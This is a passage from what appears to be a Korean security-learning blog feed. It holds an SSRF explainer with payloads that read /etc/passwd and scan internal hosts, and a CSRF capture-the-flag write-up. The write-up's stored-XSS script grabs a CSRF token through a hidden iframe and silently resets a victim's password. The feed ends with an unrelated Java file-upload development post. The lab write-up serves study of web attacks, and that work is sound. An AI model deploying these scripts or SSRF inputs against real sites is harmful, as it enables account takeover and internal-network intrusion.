  <li>파라미터로 <code class="language-plaintext highlighter-rouge">http://localhost</code> admin 페이지 접속 가능.</li>
  <li>파라미터로 <code class="language-plaintext highlighter-rouge">ftp://localhost/etc/passwd</code> 임의의 파일 열람 가능.</li>
  <li>만약 공격자가 내부 서버의 아이피 주소 유형을 알아냈다면 알아낸 주소를 가지고 포트 스캔이 가능하다.<br /><code class="language-plaintext highlighter-rouge">http://192.168.0.x:80</code> 즉 주소값을 계속 변경하여 내부망에 존재하는 웹 페이지에 접근가능하다.</li>
</ul>

<h3 id="ssrf-대응-방안">SSRF 대응 방안</h3>
<ul>
  <li>파라미터로 URL을 안 받으면 된다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="CSRF" /><category term="SSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 와 SSRF에 대하여 정리하기.]]></summary></entry><entry><title type="html">CSRF 실습 문제 3</title><link href="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B53/" rel="alternate" type="text/html" title="CSRF 실습 문제 3" /><published>2023-05-25T00:00:00+09:00</published><updated>2023-05-26T00:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B53</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B53/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li>계정의 비밀번호를 바꿔야하는 문제이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0b2bfe87-7ca0-41c8-a52a-21915ca2ee67" alt="Pasted image 20230525174119" /></li>
</ul>

<h2 id="분석및-취약점-찾기">분석및 취약점 찾기</h2>

<h3 id="로그인">로그인</h3>
<ul>
  <li>오직 POST 요청으로 만 로그인 시도가 가능하다.</li>
  <li>로그인에 성공하면 index.php로 리다이렉션 응답이 온다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/66a1dd0c-8015-4c2a-911d-ed822b161ce3" alt="Pasted image 20230525174428" /></li>
</ul>

<h3 id="게시판">게시판</h3>
<ul>
  <li>제목과 본문에 XSS 취약점이 존재한다. 취약점 유형은 <strong>Stored XSS</strong> 이다.</li>
  <li>제목<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/75fd34d6-c2f1-4dfb-a4ff-f870e64e63a3" alt="Pasted image 20230525174620" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6c84a722-dc91-4ef4-bca3-9876132c43e7" alt="Pasted image 20230525174637" /></li>
  <li>본문<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8bfbeb17-1032-4d4f-8dfb-bce9bbce73e2" alt="Pasted image 20230525174704" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/54f1639f-1e9f-4d6c-9248-8b608cbe1d03" alt="Pasted image 20230525174720" /></li>
</ul>

<h3 id="비밀번호-변경-요청">비밀번호 변경 요청</h3>
<ul>
  <li>비밀번호 변경 요청을 보내기 위해서는 서버에서 제공한 csrf 토큰 값이 필요하다.</li>
  <li>비밀번호 변경 POST 요청을 보낼때 csrf 토큰 값도 같이 전송된다.</li>
  <li>csrf 토큰 값은 마이페이지에 방문하였을 때 서버에서 할당해주는 값이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a34bfa78-a1d5-47e5-9c2a-ba1df25d1521" alt="Pasted image 20230525175632" />
![[Pasted image 20230525175632.png]]</li>
  <li>burp suite의 리피터 기능으로 referer 값을 변경하여 전송해 보았는데 비밀번호가 잘 변경되었다. 즉 referer 검사 기능은 없는것 같다.</li>
  <li>정상적인 referer<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fb3c5a77-e649-4a17-8edc-e8fcd84779d1" alt="Pasted image 20230525181508" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c171a27-902d-4294-8234-3556942065af" alt="Pasted image 20230525181518" /></li>
  <li>referer 변경<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fca173d6-f89a-4453-9fb7-98add3e37262" alt="Pasted image 20230525181718" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/dca8c56c-7fc4-41ec-9092-715a3f3bbf5d" alt="Pasted image 20230525181518" /></li>
  <li>비밀번호 변경이 완료되면 <code class="language-plaintext highlighter-rouge">index.php</code>로 이동한다.</li>
</ul>

<h2 id="비밀번호-변경-시나리오">비밀번호 변경 시나리오</h2>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOyVheyEsSDsiqTtgazrpr3tirgg64Sj7J2AIOqyjOyLnOq4gCDsnpHshLEg7KCA7J6lIOyalOyyrVxu7ISc67KEIC0-PiDqs7XqsqnsnpAgOiDsoIDsnqUg7JmE66OMIOydkeuLtVxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDqs7XqsqnsnpAg6rKM7Iuc6riAIO2OmOydtOyngCDsmpTssq1cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIOydkeuLtVxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDslYXshLEg7Iqk7YGs66a97Yq4IOyLpO2WiVxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDruYTrsIDrsojtmLgg67OA6rK9IOyalOyyrVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDruYTrsIDrsojtmLgg67OA6rK9IOyZhOujjCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<ol>
  <li>공격자는 비밀번호 변경 요청 스크립트를 넣은 게시글을 작성한다.</li>
  <li>사용자가 공격자 게시글을 방문하면 사용자 브라우저에서 악성 스크립트가 실행되어 비밀번호가 자동으로 변경된다.</li>
  <li>사용자는 비밀번호가 변경되었다는 사실을 다시 로그인 하기 전 까지는 알 수가 없다.</li>
</ol>

<h2 id="공격-스크립트">공격 스크립트</h2>

<h3 id="csrf-token-얻기">CSRF Token 얻기</h3>
<ul>
  <li>마이페이지에서 csrf 토큰을 가져와야한다.</li>
  <li>iframe 태그를 이용하여 csrf 토큰을 가지고오자.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_3/mypage.php"</span> <span class="na">onload=</span><span class="s">"load()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">load</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">csrf_token</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
	<span class="nf">alert</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h3 id="비밀번호-변경-요청-보내기">비밀번호 변경 요청 보내기</h3>
<ul>
  <li>iframe로 얻은 csrf 토큰 값을 변경할 비밀번호와 같이 보내준다.</li>
  <li>fetch를 이용하여 POST 요청을 보내준다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">mypage_update.php</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
<span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
	<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
		<span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
	<span class="p">},</span>
	<span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id=&amp;info=&amp;pw=</span><span class="dl">"</span><span class="o">+</span><span class="nx">pw</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;csrf_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span>
<span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nf">text</span><span class="p">()));</span>
</code></pre></div></div>

<h3 id="최종-공격-스크립트">최종 공격 스크립트</h3>
<ul>
  <li>iframe을 통해 마이페이지를 가장 먼저 로딩해야 한다.</li>
  <li>csrf토큰을 가져온다.</li>
  <li>fetch 함수를 이용하여 비밀번호 변경 POST 요청을 보낸다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_3/mypage.php"</span> <span class="na">onload=</span><span class="s">"load()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">load</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">pw</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1234</span><span class="dl">"</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">csrf_token</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
	<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">mypage_update.php</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
	<span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
		<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
			<span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
		<span class="p">},</span>
		<span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id=&amp;info=&amp;pw=</span><span class="dl">"</span><span class="o">+</span><span class="nx">pw</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;csrf_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span>
	<span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nf">text</span><span class="p">()));</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h2 id="공격-시작">공격 시작</h2>
<ol>
  <li>공격자는 악성 스크립트가 담긴 게시글을 작성한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/bf9a2752-469c-44a0-867c-5a179180c263" alt="Pasted image 20230525190354" /></li>
  <li>게시글 저장 확인<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/def52236-bbb6-4b6f-a9e6-e955dcc5086a" alt="Pasted image 20230525190423" /></li>
  <li>사용자가 게시글을 방문하면 악성 스크립트가 실행되어 사용자의 비밀번호를 “1234”로 변경한다.</li>
  <li>Burp Suite로 확인하였을 때 POST 요청이 잘 되었다는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3fc2fc06-bd0f-4f39-9612-8570069fa9ba" alt="Pasted image 20230525190829" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0f44c814-b04d-456d-aefd-5b860d6eb904" alt="Pasted image 20230525190845" /></li>
</ol>

<h2 id="결론">결론</h2>
<ul>
  <li>csrf 공격을 예방하기 위하여 서버에서는 csrf 토큰을 사용하였지만 서버의 xss 취약점과 iframe 태그를 이용하여 csrf 토큰 방어법을 우회하였다.</li>
  <li>fetch 함수를 통해 POST 전송을 보다 쉽게할 수 있었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d286ca44-4185-4277-ad72-e8fb5bdee8b3" alt="Pasted image 20230525190729" /></li>
  <li>사용자는 정상적으로 게시글을 확인하였다고 느낀다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3afde40a-f935-45fa-b5a2-dd7038de3ebd" alt="Pasted image 20230525191153" /></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="csrf" /><category term="xss" /><summary type="html"><![CDATA[CSRF 실습 문제 풀어보기]]></summary></entry><entry><title type="html">웹 서버 만들기(13) 업로드 다운로드 조회수</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C13/" rel="alternate" type="text/html" title="웹 서버 만들기(13) 업로드 다운로드 조회수" /><published>2023-05-25T00:00:00+09:00</published><updated>2023-05-25T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C13</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C13/"><![CDATA[<h2 id="파일-업로드">파일 업로드</h2>
<ul>
  <li>Part API를 이용하여 파일 업로드를 구현하였다.</li>
</ul>

<h3 id="단일-파일-최대-용량-설정-nginx">단일 파일 최대 용량 설정 (Nginx)</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/etc/nginx/nginx.conf</code> 에서 단일 파일 최대 용량을 <strong>500MB</strong>로 설정하였다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... 생략 ...
http {
        client_max_body_size 500M;
        ... 생략...
}
</code></pre></div></div>

<ul>
  <li>업로드 할 단일 파일 크기가 500MB를 넘으면 오류가 발생한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/359959d7-a37f-4f13-883d-f57251175668" alt="Pasted image 20230524223827" /></li>
</ul>

<p><br /></p>

<h3 id="게시글-새로-저장">게시글 새로 저장</h3>
<h4 id="jsp">JSP</h4>
<h5 id="설명">설명</h5>
<ul>
  <li>file 선택을 위한 <code class="language-plaintext highlighter-rouge">input</code> 태그에서 type 속성 값을 <code class="language-plaintext highlighter-rouge">file</code>로 설정한다.</li>
  <li><code class="language-plaintext highlighter-rouge">form</code> 태그에서 enctype 속성 값을 <code class="language-plaintext highlighter-rouge">multipart/form-data</code>로 해준다. 대용량 파일을 서버로 보내기 위한 설정이다.</li>
  <li>한 게시물당 최대 3개 까지 첨부파일을 저장할 수 있지만 아직 한 게시물에 동시에 파일 추가되는 기능은 구현하지 않았다.</li>
</ul>

<h5 id="과정">과정</h5>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyCrOyaqeyekCA6IOq4gOyTsOq4sCDrsoTtirwg7YG066atLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg7J6R7ISxIOuwjyDssqjrtoDtjIzsnbwg7ISg7YOdLiDsoIDsnqUg67KE7Yq8IO2BtOumrS5cbuyCrOyaqeyekCAtPj4g7ISc67KEIDog7KCc66qpLCDrs7jrrLgg6re466as6rOgIO2MjOydvOydhCDshJzrsoTroZwg7KCE7IahLlxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsoJzrqqksIOuzuOusuCDsoIDsnqUg7JqU7LKtLlxuREIg7ISc67KEIC0-PiDshJzrsoQgOiDsoIDsnqUg7JmE66OMIOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDssqjrtoDtjIzsnbwg7KCA7J6lLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg7J6R7ISxIOyEseqztSDrmJDripQg7Iuk7YyoIOyXrOu2gCDsoITshqEuIiwibWVybWFpZCI6bnVsbH0" /></p>

<ol>
  <li>사용자가 글쓰기 버튼을 클릭한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/10e6984c-9fc0-43fe-9a42-2558b6d7e3a8" alt="Pasted image 20230524224712" /></li>
  <li>제목과 본문을 작성한다. 그리고 파일선택 버튼을 클릭하여 업로드할 파일을 선택하여준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/78a2bee2-f34a-415c-85ef-5aa12523df6e" alt="Pasted image 20230524225111" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/74bddbb7-3f3c-4ecc-9270-fc9264f4a6cc" alt="Pasted image 20230524224837" /></li>
  <li>게시글 작성이 완료되고 저장 버튼을 누르면 게시글과 첨부파일이 서버로 전송되어 저장된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8df6dcc9-9f2b-4abb-8aef-c0e339cd73e1" alt="Pasted image 20230524225050" /></li>
  <li>게시글 확인 <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/50ff532b-532c-4e5e-a720-35a7ae8aed19" alt="Pasted image 20230524225214" /></li>
  <li>서버에 파일이 잘 업로드 된 것을 확인할 수 있다.</li>
</ol>

<h5 id="코드--notice_writejsp-">코드 ( notice_write.jsp )</h5>

<ul>
  <li>form 의 enctype 속성을 추가하였고, input의 type 속성을 <code class="language-plaintext highlighter-rouge">file</code>로 해주었다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... 생략 ...
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"${noticeBoardURL}"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
... 생략 ...
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"UPLOAD_FILE"</span><span class="nt">/&gt;</span>
... 생략 ...
</code></pre></div></div>

<h4 id="servlet">Servlet</h4>
<h5 id="설명-1">설명</h5>
<ul>
  <li>사용자가 전송한 제목, 본문은 DB서버에 저장하고 파일은 웹 서버에 저장한다.</li>
  <li>POST 요청으로 들어온다.</li>
  <li>최대 3개의 파일 까지 서버에 저장이 가능하다.</li>
  <li><code class="language-plaintext highlighter-rouge">part.getHeader("Content-Disposition").contains("filename=")</code> 을 통해 파일인지 아니면 그냥 텍스트인지 구분한다.</li>
  <li>파일이름이 없으면 서버에 파일을 저장하지 않는다.</li>
</ul>

<h5 id="과정-1">과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOygnOuqqSwg67O466y4LCDssqjrtoDtjIzsnbwg7KCE7IahXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOygnOuqqSwg67O466y4IGRi7JeQIOyggOyepSDsmpTssq0uXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOyggOyepSDsmYTro4wg7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDssqjrtoDtjIzsnbwg7KCA7J6lLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zrrLwg7KCA7J6lIOyEseqztSDrmJDripQg7Iuk7YyoIOyXrOu2gCDsoITshqEiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<ol>
  <li>사용자가 제목, 본문 그리고 파일을 첨부하여 POST 전송으로 서버에 보낸다.</li>
  <li>제목과 본문을 DB서버에 저장해준다.</li>
  <li>게시물 저장 시간과 게시물 번호를 이용하여 게시문 파일을 저장하기 위한 폴더를 만들어준다.</li>
  <li>폴더에 사용자가 첨부한 파일을 저장한다. 최대 저장가능한 파일 수를 3개로 설정하였다.</li>
  <li>하지만 만약 파일을 서버에 저장 중 오류가 발생한다면 게시글 즉 제목과 본문은 저장되고 파일만 서버에 저장이 안된다.</li>
</ol>

<h5 id="코드--mainpagejava-">코드 ( MainPage.java )</h5>

<ul>
  <li>사용자가 업로드한 파일을 웹 서버에 바로 저장해 준다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">MAX_FILE_NUM</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span> <span class="c1">// 최대 저장 가능한 파일수-1</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
		<span class="c1">// 글 저장</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"POST"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardSave</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">charSet</span> <span class="o">=</span> <span class="s">"utf-8"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setCharacterEncoding</span><span class="o">(</span><span class="n">charSet</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">request</span><span class="o">.</span><span class="na">getContentType</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"multipart/form-data"</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">//404 에러 발생</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// application/x-www-form-urlencoded 타입이 아니라.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 오직 multipart/form-data 타입만 받는다.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
	<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 제목 본문 DB에 저장.</span>
	<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="nc">User</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">notice</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeBoardDAO</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">genTime</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span> <span class="c1">// 게시글 생성 시각</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSid</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">saveNotice</span><span class="o">(</span><span class="n">user</span><span class="o">,</span> <span class="n">title</span><span class="o">,</span> <span class="n">mainText</span><span class="o">,</span><span class="n">genTime</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">noticeSid</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span> <span class="c1">// db 저장 실패</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('fail');location.href='"</span><span class="o">+</span><span class="n">noticeBoardWrite</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// ***** 파일 업로드 시작 *****</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"no file"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 생성 또는 존재 확인</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 저장을 위한 폴더</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">genTime</span><span class="o">+</span><span class="s">"_"</span><span class="o">+</span> <span class="n">noticeSid</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// genTime + _ + noticeSID =&gt; 폴더명</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">parts</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParts</span><span class="o">();</span>
